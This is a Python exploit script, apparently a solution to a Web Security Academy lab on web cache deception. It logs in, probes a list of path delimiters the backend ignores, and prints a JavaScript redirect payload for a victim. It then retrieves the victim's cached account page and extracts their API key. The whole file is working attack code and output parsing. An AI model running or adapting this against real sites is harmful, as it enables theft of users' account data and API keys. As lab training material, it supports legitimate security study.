import http.client
import random
import re
import ssl
import string
import urllib.parse

LAB_ID = "???"


def GET_login() -> http.client.HTTPResponse:
    method, path = 'GET', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def POST_login(
        session: str,
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-form-www-urlencoded;charset=UTF-8',
        'cookie': f'session={session}',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter',
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def login_csrf() -> tuple[str, str]:
    response = GET_login()
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response.read().decode('utf-8'))[0]
    return session, csrf


def login_session():
    session, csrf = login_csrf()
    response = POST_login(session, csrf)
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]


def GET_myaccount(
        session: str,
        suffix: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', f'/my-account{suffix}'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'cookie': f'session={session}',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, '', headers)
    return connection.getresponse()


delimiters = [
    '!', '"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[',
    '\\', ']', '^', '_', '`', '{', '|', '}', '~', '%21', '%22', '%23', '%24', '%25', '%26', '%27', '%28', '%29', '%2A',
    '%2B', '%2C', '%2D', '%2E', '%2F', '%3A', '%3B', '%3C', '%3D', '%3E', '%3F', '%40', '%5B', '%5C', '%5D', '%5E',
    '%5F', '%60', '%7B', '%7C', '%7D', '%7E',
]

session = login_session()

print("success response:")
success_response = GET_myaccount(session, suffix="")
success_status = success_response.status
print(f"status: {success_status}")

print("fail response:")
fail_response = GET_myaccount(session, suffix="aaa")
fail_status = fail_response.status
print(f"status: {fail_status}")

found_delimiter: str
for delimiter in delimiters:
    print(f"testing delimiter: {delimiter}")
    response = GET_myaccount(session, suffix=f"{delimiter}aaa")
    if response.status == success_status:
        print(f"found delimiter: {delimiter}")
        found_delimiter = delimiter
        break
    if response.status != fail_status:
        print(f"unusual response status: {response.status} for delimiter: {delimiter}")
else:
    print("could not find delimiter ignored by backend server")
    exit(1)

random_str = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
print("Exploit:")
print(f"""<script>
window.location.href = "https://{LAB_ID}.web-security-academy.net/my-account{found_delimiter}{random_str}.css"
</script>""")
input("Deliver exploit to victim and hit enter")
response = GET_myaccount(session, suffix=f"{found_delimiter}{random_str}.css")
response_body = response.read().decode()
print(f"status: {response.status}")
for name, value in response.headers.items():
    print(f"{name}: {value}")
print(response_body)
api_key = re.findall(r"<div>Your API Key is: ([a-zA-Z0-9]+)</div>", response_body)[0]
print(f"api_key: {api_key}")
